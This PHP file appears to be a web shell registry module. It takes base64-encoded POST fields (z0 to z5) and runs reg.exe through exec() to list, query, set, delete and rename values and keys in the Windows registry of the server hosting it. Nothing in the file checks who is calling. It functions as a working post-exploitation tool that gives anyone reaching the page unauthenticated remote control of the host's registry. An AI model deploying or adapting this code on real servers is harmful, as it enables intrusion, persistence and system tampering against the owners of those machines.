<?php

// Helper
function run_reg(string $cmd, array &$output = null): int
{
    $output = [];
    return exec($cmd . ' 2>&1', $output);
}

function validate_registry_path(string $path): bool
{
    return (bool)preg_match('/^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\\\[A-Za-z0-9_\\\\-]+$/', $path);
}

function validate_value_name(string $name): bool
{
    return (bool)preg_match('/^[A-Za-z0-9 _\\-]+$/', $name);
}

// Functions

function registry_value_to_bytes(string $value, string $type): string 
{
    switch ($type) {

        case 'REG_DWORD':
            $value = preg_replace('/^0x/i', '', $value);
            $num = hexdec($value);

            return pack("V", $num);

        case 'REG_QWORD':
            $value = preg_replace('/^0x/i', '', $value);
            $num = hexdec($value);

            return pack("P", $num);

        case 'REG_BINARY':
            $hex = preg_replace('/\s+/', '', $value);
            return hex2bin($hex);

        case 'REG_SZ':
        case 'REG_EXPAND_SZ':
        case 'REG_MULTI_SZ':
        default:
            return iconv("UTF-8", "UTF-16LE", $value . "\0");
    }
}

function scan_hives(array $hives): array
{
    $result = [];

    foreach ($hives as $hive) {
        $output = [];
        $ret = 0;

        exec(
            'reg query ' . escapeshellarg($hive) . ' 2>&1',
            $output,
            $ret
        );

        $result[$hive] = ($ret === 0);
    }

    return $result;
}

function scan_registry(string $base_path): array
{
    $output = [];
    $ret = 0;

    exec(
        'reg query ' . escapeshellarg($base_path) . ' 2>&1',
        $output,
        $ret
    );

    // Always return the same schema
    $result = [
        'success' => ($ret === 0),
        'error'    => null,
        'subkeys'  => [],
        'values'   => []
    ];

    if ($ret !== 0) {
        $result['error'] = implode("\n", $output);
        return $result;
    }

    $firstKeySeen = false;

    foreach ($output as $line) {

        $line = rtrim($line);

        if ($line === '') {
            continue;
        }

        // Registry key paths
        if (preg_match('/^HKEY_/', $line)) {

            if (!$firstKeySeen) {
                $firstKeySeen = true;
            } else {
                $result['subkeys'][] = $line;
            }

            continue;
        }

        // Registry values
        if (preg_match('/^\s*(.*?)\s+(REG_\w+)\s+(.*)$/', $line, $m)) {

            $type = trim($m[2]);
            $value = trim($m[3]);

            $result['values'][] = [
                'name' => trim($m[1]),
                'type' => $type,
                'data' => base64_encode(
                    registry_value_to_bytes($value, $type)
                )
            ];
        }
    }

    return $result;
}

function set_registry_value(string $path, string $name, string $type, string $data): array
{
    $allowedType = [
        'REG_SZ',
        'REG_EXPAND_SZ',
        'REG_DWORD',
        'REG_QWORD',
        'REG_BINARY',
        'REG_MULTI_SZ'
    ];

    if (!in_array($type, $allowedType, true)) {
        return [
            'success' => false,
            'error' => 'Invalid type'
        ];
    }

    if (!(validate_registry_path($path) && validate_value_name($name))) {
        return [
            'success' => false,
            'error' => 'Invalid path or name'
        ];
    }

    // Format data properly for reg.exe
    switch ($type) {
        case 'REG_DWORD':
            $data = is_numeric($data) ? (string)$data : hexdec($data);
            break;

        case 'REG_QWORD':
            $data = is_numeric($data) ? (string)$data : hexdec($data);
            break;

        case 'REG_BINARY':
            $data = preg_replace('/\s+/', '', $data);
            break;

        case 'REG_MULTI_SZ':
            $data = str_replace(",", "\0", $data);
            break;

        default:
            // REG_SZ / EXPAND_SZ
            break;
    }

    $cmd = sprintf(
        'reg add %s /v %s /t %s /d %s /f',
        escapeshellarg($path),
        escapeshellarg($name),
        escapeshellarg($type),
        escapeshellarg($data)
    );

    run_reg($cmd, $out);
    $ok = (strpos(implode('\n', $out), 'ERROR') === false);

    return [
        'success' => $ok,
        'output' => $out
    ];
}

function delete_registry_value(string $path, string $name): array
{
    if (!(validate_registry_path($path) && validate_value_name($name))) {
        return [
            'success' => false,
            'error' => 'Invalid input'
        ];
    }

    $cmd = sprintf(
        'reg delete %s /v %s /f',
        escapeshellarg($path),
        escapeshellarg($name)
    );

    run_reg($cmd, $out);

    return [
        'success' => true,
        'output' => $out
    ];
}

function rename_registry_value(string $path, string $oldName, string $newName): array
{
    if (!(validate_registry_path($path) && validate_value_name($oldName) && validate_value_name($newName))) {
        return [
            'success' => false,
            'error' => 'Invalid input'
        ];
    }

    $scan = scan_registry($path);

    $valueData = null;
    foreach ($scan['values'] as $v) {
        if ($v['name'] === $oldName) {
            $valueData = $v;

            break;
        }
    }

    if (!$valueData) {
        return [
            'success' => false,
            'error' => 'Value not found'
        ];
    }

    $decoded = base64_decode($valueData['data']);
    $set = set_registry_value($path, $newName, $valueData['type'], $decoded);

    if (!$set['success']) {
        return $set;
    }

    return delete_registry_value($path, $oldName);
}

function rename_registry_key(string $oldPath, string $newPath): array
{
    if (!validate_registry_path($oldPath)) {
        return [
            'success' => false,
            'error' => 'Invalid source path'
        ];
    }

    $cmd = sprintf(
        'reg copy %s %s /s /f',
        escapeshellarg($oldPath),
        escapeshellarg($newPath)
    );

    run_reg($cmd, $out);

    $ok = (strpos(implode("\n", $out), 'ERROR') === false);

    if (!$ok) {
        return [
            'success' => false,
            'output' => $out
        ];
    }

    // delete old key
    $cmd2 = sprintf(
        'reg delete %s /f',
        escapeshellarg($oldPath)
    );

    run_reg($cmd2, $out2);

    return [
        'success' => true,
        'output' => array_merge($out, $out2)
    ];
}

$action = base64_decode($_POST['z0'] ?? '') ?: '';
$encoding = base64_decode($_POST['z1'] ?? '') ?: 'utf-8';

header('Content-Type: application/json; charset=' . $encoding);

$hives = [
    'HKEY_CLASSES_ROOT',
    'HKEY_CURRENT_USER',
    'HKEY_LOCAL_MACHINE',
    'HKEY_USERS',
    'HKEY_CURRENT_CONFIG'
];

switch ($action) {
    case 'hive':
        echo json_encode(
            scan_hives($hives),
            JSON_UNESCAPED_UNICODE
        );
        break;
    case 'scan':
        $base_path = base64_decode($_POST['z2'] ?? '') ?: '';
        echo json_encode(
            scan_registry($base_path),
            JSON_UNESCAPED_UNICODE
        );
        break;
    case 'set':
        echo json_encode(set_registry_value(
            base64_decode($_POST['z2']),    // path
            base64_decode($_POST['z3']),    // name
            base64_decode($_POST['z4']),    // type
            base64_decode($_POST['z5'])     // data
        ));
        break;
    case 'del':
        echo json_encode(delete_registry_value(
            base64_decode($_POST['z2']),    // path
            base64_decode($_POST['z3'])     // name
        ));
        break;
    case 'rename_value':
        echo json_encode(rename_registry_value(
            base64_decode($_POST['z2']),    // path
            base64_decode($_POST['z3']),    // old name
            base64_decode($_POST['z4'])     // new name
        ));
        break;
    case 'rename_key':
        echo json_encode(rename_registry_key(
            base64_decode($_POST['z2']),    // old path
            base64_decode($_POST['z3'])     // new path
        ));
        break;
    default:
        echo json_encode([
            'success' => false,
            'error' => 'Unknown action',
            'subkeys' => [],
            'values' => []
        ]);
        break;
}